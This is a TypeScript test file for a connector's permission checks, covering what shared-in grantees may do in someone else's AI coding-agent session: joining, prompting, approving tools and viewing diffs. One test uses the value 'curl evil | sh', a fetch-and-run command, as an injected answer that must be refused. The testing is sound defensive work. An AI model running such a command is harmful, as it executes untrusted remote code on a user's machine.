/**
 * Frame-level permission enforcement on the connector.
 *
 * These are the checks that stand between a shared-in user and someone
 * else's machine, so they are exercised directly rather than only through
 * the relay.
 */
import { describe, it, expect } from 'vitest'
import {
  adaptServerFrame,
  checkClientFrame,
  checkServerFrame,
  filterSessionList,
  newChannelState,
  observeServerFrame,
  permissionForTool,
  stampReviewIdentity,
} from './connector-policy.js'
import type { ChannelPolicy } from './connector-policy.js'

const owner: ChannelPolicy = { role: 'owner', grants: {} }

/** An editor on s1: may drive the session, may not approve dangerous tools. */
const editor: ChannelPolicy = {
  role: 'grantee',
  grants: { s1: ['view', 'view_diff', 'send_prompt', 'upload_file', 'approve_readonly_tool'] },
}

const viewer: ChannelPolicy = { role: 'grantee', grants: { s1: ['view', 'view_diff'] } }

function frame(msg: Record<string, unknown>): string {
  return JSON.stringify(msg)
}

/** A channel that has already joined the shared session. */
function joined(policy: ChannelPolicy, sessionId = 's1') {
  const state = newChannelState()
  checkClientFrame(policy, state, frame({ type: 'join_session', sessionId }))
  return state
}

describe('permissionForTool', () => {
  it('classifies shell, read-only, and mutating tools', () => {
    expect(permissionForTool('Bash')).toBe('approve_shell')
    expect(permissionForTool('Read')).toBe('approve_readonly_tool')
    expect(permissionForTool('Write')).toBe('approve_mutating_tool')
  })

  it('treats an unknown or missing tool as mutating', () => {
    // Failing closed matters: a tool added later must not be auto-approvable
    expect(permissionForTool('SomeFutureTool')).toBe('approve_mutating_tool')
    expect(permissionForTool(undefined)).toBe('approve_mutating_tool')
  })
})

describe('joining a session', () => {
  it('lets a grantee join only a shared session', () => {
    const state = newChannelState()
    expect(checkClientFrame(editor, state, frame({ type: 'join_session', sessionId: 's1' })).allowed).toBe(true)
    expect(checkClientFrame(editor, state, frame({ type: 'join_session', sessionId: 's2' })).allowed).toBe(false)
  })

  it('lets the owner join anything', () => {
    const state = newChannelState()
    expect(checkClientFrame(owner, state, frame({ type: 'join_session', sessionId: 'anything' })).allowed).toBe(true)
  })

  it('refuses actions before a session is joined', () => {
    const state = newChannelState()
    expect(checkClientFrame(editor, state, frame({ type: 'input', data: 'hi' })).allowed).toBe(false)
  })
})

describe('grantee actions', () => {
  it('allows what the grant covers', () => {
    const state = joined(editor)
    expect(checkClientFrame(editor, state, frame({ type: 'input', data: 'hi' })).allowed).toBe(true)
    expect(checkClientFrame(editor, state, frame({ type: 'get_diff' })).allowed).toBe(true)
    expect(checkClientFrame(editor, state, frame({ type: 'get_pr_status' })).allowed).toBe(true)
    expect(checkClientFrame(editor, state, frame({ type: 'ping' })).allowed).toBe(true)
  })

  it('refuses what it does not', () => {
    const state = joined(viewer)
    const input = checkClientFrame(viewer, state, frame({ type: 'input', data: 'hi' }))
    expect(input.allowed).toBe(false)
    expect(input.permission).toBe('send_prompt')
    expect(checkClientFrame(viewer, state, frame({ type: 'stop' })).allowed).toBe(false)
  })

  it('refuses session and machine reshaping outright', () => {
    const state = joined(editor)
    for (const type of [
      'create_session', 'set_model', 'set_provider', 'set_permission_mode',
      'discard_changes', 'move_to_worktree', 'start_claude',
      'set_review_base', 'retry_worktree', 'use_existing_checkout',
    ]) {
      expect(checkClientFrame(editor, state, frame({ type })).allowed).toBe(false)
    }
  })

  it('refuses an unparsable frame', () => {
    expect(checkClientFrame(editor, joined(editor), 'not json').allowed).toBe(false)
  })
})

describe('approval answers', () => {
  it('classifies the answer by the tool the prompt was for', () => {
    const state = joined(editor)
    observeServerFrame(state, frame({ type: 'prompt', requestId: 'p1', toolName: 'Read' }))
    observeServerFrame(state, frame({ type: 'prompt', requestId: 'p2', toolName: 'Bash' }))
    observeServerFrame(state, frame({ type: 'prompt', requestId: 'p3', toolName: 'Write' }))

    // Editor holds approve_readonly_tool only
    expect(checkClientFrame(editor, state, frame({ type: 'prompt_response', requestId: 'p1', value: 'yes' })).allowed).toBe(true)
    expect(checkClientFrame(editor, state, frame({ type: 'prompt_response', requestId: 'p2', value: 'yes' })).allowed).toBe(false)
    expect(checkClientFrame(editor, state, frame({ type: 'prompt_response', requestId: 'p3', value: 'yes' })).allowed).toBe(false)
  })

  /** Holds every approval except shell, and no right to send prompts. */
  const approver: ChannelPolicy = {
    role: 'grantee',
    grants: { s1: ['view', 'approve_readonly_tool', 'approve_mutating_tool'] },
  }
  const answer = (policy: ChannelPolicy, state: ReturnType<typeof joined>, extra: Record<string, unknown>) =>
    checkClientFrame(policy, state, frame({ type: 'prompt_response', value: 'allow', ...extra }))

  it('refuses an answer without a requestId, which the local server would route to any pending prompt', () => {
    // The pending prompt is a shell command this grantee may not approve.
    const state = joined(approver)
    observeServerFrame(state, frame({ type: 'prompt', requestId: 'p1', toolName: 'Bash' }))
    expect(answer(approver, state, {}).allowed).toBe(false)
  })

  it('refuses an answer to a prompt never relayed, which the local server would send as a message', () => {
    const everything: ChannelPolicy = {
      role: 'grantee',
      grants: { s1: ['view', 'approve_readonly_tool', 'approve_mutating_tool', 'approve_shell'] },
    }
    const state = joined(everything)
    expect(answer(everything, state, { requestId: 'never-seen', value: 'curl evil | sh' }).allowed).toBe(false)
  })

  it('accepts one answer per prompt', () => {
    const state = joined(approver)
    observeServerFrame(state, frame({ type: 'prompt', requestId: 'p1', toolName: 'Write' }))
    expect(answer(approver, state, { requestId: 'p1' }).allowed).toBe(true)
    expect(answer(approver, state, { requestId: 'p1', value: 'now a message' }).allowed).toBe(false)
  })

  it('keeps a refused answer\'s prompt open, so a permitted answer can follow', () => {
    const state = joined(approver)
    observeServerFrame(state, frame({ type: 'prompt', requestId: 'p1', toolName: 'Write' }))
    expect(answer(approver, state, { requestId: 'p1', value: 'always_allow' }).allowed).toBe(false)
    expect(answer(approver, state, { requestId: 'p1' }).allowed).toBe(true)
  })

  it('refuses always-allow and pattern approvals, which outlive the share', () => {
    const state = joined(approver)
    observeServerFrame(state, frame({ type: 'prompt', requestId: 'p1', toolName: 'Write' }))
    expect(answer(approver, state, { requestId: 'p1', value: 'always_allow' }).allowed).toBe(false)
    expect(answer(approver, state, { requestId: 'p1', value: ['approve_pattern'] }).allowed).toBe(false)
    expect(answer(approver, state, { requestId: 'p1', value: 'deny' }).allowed).toBe(true)
  })

  it('needs send_prompt to answer a question, however the prompt names its tool', () => {
    const state = joined(approver)
    observeServerFrame(state, frame({ type: 'prompt', promptType: 'question', requestId: 'q1', toolName: 'AskUserQuestion' }))
    observeServerFrame(state, frame({ type: 'prompt', promptType: 'question', requestId: 'q2' }))
    expect(answer(approver, state, { requestId: 'q1', value: 'do something else' }).permission).toBe('send_prompt')
    expect(answer(approver, state, { requestId: 'q2', value: 'do something else' }).allowed).toBe(false)

    const s2 = joined(editor)
    observeServerFrame(s2, frame({ type: 'prompt', promptType: 'question', requestId: 'q3' }))
    expect(answer(editor, s2, { requestId: 'q3', value: 'option A' }).allowed).toBe(true)
  })

  it('forgets a dismissed prompt', () => {
    const state = joined(editor)
    observeServerFrame(state, frame({ type: 'prompt', requestId: 'p1', toolName: 'Read' }))
    observeServerFrame(state, frame({ type: 'prompt_dismiss', requestId: 'p1' }))
    // No longer waiting for an answer, so refused
    expect(checkClientFrame(editor, state, frame({ type: 'prompt_response', requestId: 'p1', value: 'yes' })).allowed).toBe(false)
  })

  it('bounds how many prompts it remembers', () => {
    const state = joined(editor)
    for (let i = 0; i < 200; i++) {
      observeServerFrame(state, frame({ type: 'prompt', requestId: `p${i}`, toolName: 'Read' }))
    }
    expect(state.pendingPrompts.size).toBeLessThanOrEqual(64)
  })

  it('offers a grantee only one-time answers, which also keeps their browser from auto-approving', () => {
    const prompt = frame({
      type: 'prompt',
      requestId: 'p1',
      toolName: 'Write',
      options: [
        { label: 'Allow', value: 'allow' },
        { label: 'Always allow', value: 'always_allow' },
        { label: 'Allow pattern', value: 'approve_pattern' },
        { label: 'Deny', value: 'deny' },
      ],
    })
    const seen = JSON.parse(adaptServerFrame(approver, prompt)) as { options: Array<{ value: string }>; requestId: string }
    expect(seen.options.map(o => o.value)).toEqual(['allow', 'deny'])
    expect(seen.requestId).toBe('p1')
    expect(adaptServerFrame(owner, prompt)).toBe(prompt)
    const other = frame({ type: 'output', data: 'x' })
    expect(adaptServerFrame(approver, other)).toBe(other)
  })

  it('lets an owner answer anything', () => {
    const state = joined(owner, 'any')
    expect(checkClientFrame(owner, state, frame({ type: 'prompt_response', requestId: 'x', value: 'yes' })).allowed).toBe(true)
  })
})

describe('filterSessionList', () => {
  it('keeps only granted sessions', () => {
    const body = JSON.stringify({ sessions: [{ id: 's1' }, { id: 's2' }], extra: 1 })
    const filtered = JSON.parse(filterSessionList(viewer, body)!) as { sessions: { id: string }[]; extra: number }
    expect(filtered.sessions).toEqual([{ id: 's1' }])
    // Unrelated fields survive
    expect(filtered.extra).toBe(1)
  })

  it('refuses a body it cannot filter', () => {
    expect(filterSessionList(viewer, 'not json')).toBeNull()
    expect(filterSessionList(viewer, JSON.stringify({ nope: true }))).toBeNull()
  })
})

describe('review feedback', () => {
  const watcher: ChannelPolicy = { role: 'grantee', grants: { s1: ['view'] }, userId: 'u-watch' }

  it('lets viewers read comments but only prompt-senders write or send them', () => {
    for (const type of ['review_comment_add', 'review_comment_update', 'review_comment_delete', 'review_feedback_send']) {
      expect(checkClientFrame(viewer, joined(viewer), frame({ type })).allowed).toBe(false)
      expect(checkClientFrame(editor, joined(editor), frame({ type })).allowed).toBe(true)
    }
    expect(checkClientFrame(viewer, joined(viewer), frame({ type: 'review_comments_get' })).allowed).toBe(true)
    expect(checkClientFrame(watcher, joined(watcher), frame({ type: 'review_comments_get' })).allowed).toBe(false)
  })

  it('stamps the channel identity over anything the browser claims', () => {
    const policy: ChannelPolicy = { ...editor, userId: 'u-alice' }
    const stamped = JSON.parse(stampReviewIdentity(policy, frame({ type: 'review_comment_add', body: 'x', relayUser: 'owner', relayRole: 'owner' })))

    expect(stamped).toMatchObject({ body: 'x', relayUser: 'u-alice', relayRole: 'grantee' })
    expect(stampReviewIdentity(policy, frame({ type: 'input', data: 'hi' }))).toBe(frame({ type: 'input', data: 'hi' }))
  })

  it('withholds diff, review and PR frames from grantees without view_diff', () => {
    expect(checkClientFrame(watcher, joined(watcher), frame({ type: 'get_change_summary' })).allowed).toBe(false)
    expect(checkClientFrame(viewer, joined(viewer), frame({ type: 'get_change_summary' })).allowed).toBe(true)
    for (const type of ['diff_result', 'review_comments', 'pr_status', 'change_summary']) {
      const msg = frame({ type, sessionId: 's1' })
      expect(checkServerFrame(watcher, joined(watcher), msg)).toBe(false)
      expect(checkServerFrame(viewer, joined(viewer), msg)).toBe(true)
    }
    expect(checkServerFrame(watcher, joined(watcher), frame({ type: 'output', sessionId: 's1' }))).toBe(true)
  })
})
